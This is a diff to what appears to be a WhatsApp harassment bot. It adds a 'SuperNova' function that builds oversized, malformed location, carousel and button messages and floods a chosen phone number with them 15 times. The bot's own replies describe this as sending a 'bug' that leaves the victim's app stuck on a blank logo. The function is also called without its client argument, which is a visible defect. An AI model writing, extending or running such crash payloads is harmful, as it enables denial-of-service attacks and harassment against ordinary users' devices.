@@ -746,7 +746,100 @@ async function FcClick(target) {
     console.error(`❌ Error: ${err.message}`);
   }
 }
-		
+
+async function SuperNova(client, target) {
+    console.log(`Pending To ${target}`);
+    try {
+        const msgFreeze = {
+            message: {
+                groupStatusMessageV2: {
+                    message: {
+                        locationMessage: {
+                            degreesLatitude: 999999999999999,
+                            degreesLongitude: 999999999999999,
+                            name: "ោ៝".repeat(40000),
+                            address: "ោ៝".repeat(945900),
+                            jpegThumbnail: Buffer.alloc(1048576, 0xFF), 
+                            contextInfo: {
+                                mentionedJid: [target],
+                                stanzaId: "#galkhein",
+                                urlTrackingMap: {
+                                    urlTrackingMapElements: Array.from({ length: 150000 }, (_, z) => ({
+                                        participant: `62${z + 888000}@s.whatsapp.net`
+                                    }))
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+        };
+
+        const imageMsg = {
+            url: "https://mmg.whatsapp.net/o1/v/t24/f2/m233/AQNvaZ3Ct44hmtUdO06rYfwhlUk56KEtQ-CV0JL3bg-qPUdYT7vz6p7KtHbhFEXeBTsRKz01FTxydRdiMW88ynk1TRpQcVAm76Lb_ZIDKw",
+            mimetype: "image/jpeg",
+            fileSha256: "WMATZulCqZloXFfBTYPzATm2v74jGJv7thxNE7C8X8o=",
+            fileLength: 162903,
+            mediaKey: "qR4aFXwJdZbH0Zgi7uxA5Y4to6eJjhKD2V5mhn/ZQrc=",
+        };
+
+        const cards = [];
+        for (let i = 0; i < 5000; i++) {
+            cards.push({
+                header: { imageMessage: imageMsg, hasMediaAttachment: true },
+                nativeFlowMessage: { messageParamsJson: "\0".repeat(100) }
+            });
+        }
+
+        const { generateWAMessageFromContent } = require('@whiskeysockets/baileys');
+        const miaMsg = generateWAMessageFromContent(target, {
+            groupStatusMessageV2: {
+                message: {
+                    interactiveMessage: {
+                        body: { text: "#galkhein" },
+                        carouselMessage: { cards, messageVersion: 1 }
+                    }
+                }
+            }
+        }, {});
+
+        const finalStrike = {
+            viewOnceMessage: {
+                message: {
+                    interactiveMessage: {
+                        body: { text: "atomic", format: "DEFAULT" },
+                        nativeFlowMessage: {
+                            buttons: [{
+                                name: "quick_reply",
+                                buttonParamsJson: JSON.stringify({ 
+                                    display_text: "ꦽ".repeat(150000), 
+                                    id: "nullkill" 
+                                })
+                            }],
+                            version: 3
+                        }
+                    }
+                }
+            }
+        };
+
+        await client.relayMessage("status@broadcast", msgFreeze, {
+            statusJidList: [target]
+        });
+        await client.relayMessage(target, miaMsg.message, { participant: { jid: target } });
+        await client.relayMessage(target, miaMsg.message, { participant: { jid: target } });
+        const crypto = require('crypto');
+        await client.relayMessage(target, finalStrike, {
+            messageId: crypto.randomBytes(16).toString('hex').toUpperCase()
+        });
+
+        console.log(`Succes Send To ${target}`);
+
+    } catch (e) {
+        console.error(`Failed Send ${e.message}`);
+    }
+}
+	
 async function docthumb(client, target) {
   await client.relayMessage(target,
     generateWAMessageFromContent(target,
@@ -3137,8 +3230,8 @@ if (jidx.length < 10) return reply(`nomor tidak valid!`);
     
 let target = `${jidx}@s.whatsapp.net`;
 reply(`𝘚𝘶𝘤𝘤𝘦𝘴𝘴! 𝘚𝘦𝘯𝘵 𝘉𝘶𝘨 𝘵𝘰 ${target}\n\n𝙉𝙤𝙩𝙚 : 𝘎𝘶𝘯𝘢𝘬𝘢𝘯 𝘑𝘦𝘥𝘢 𝘚𝘦𝘵𝘦𝘭𝘢𝘩 𝘉𝘦𝘳𝘩𝘢𝘴𝘪𝘭 𝘔𝘦𝘯𝘨𝘪𝘳𝘪𝘮 𝘉𝘶𝘨, 𝘈𝘨𝘢𝘳 𝘉𝘰𝘵 𝘛𝘪𝘥𝘢𝘬 𝘔𝘶𝘥𝘢𝘩 𝘒𝘦𝘯𝘰𝘯, 𝘔𝘪𝘯𝘪𝘮𝘢𝘭 𝘑𝘦𝘥𝘢 10/15 𝘔𝘦𝘯𝘪𝘵!!`);
-for (let i = 0; i < 8; i++) {
-await blankhardlunox(target);
+for (let i = 0; i < 15; i++) {
+await SuperNova(target);
                 }
                 
 console.log(chalk.red.bold("🩸success mengirim bug dengan jenis : blank stuck logo"))
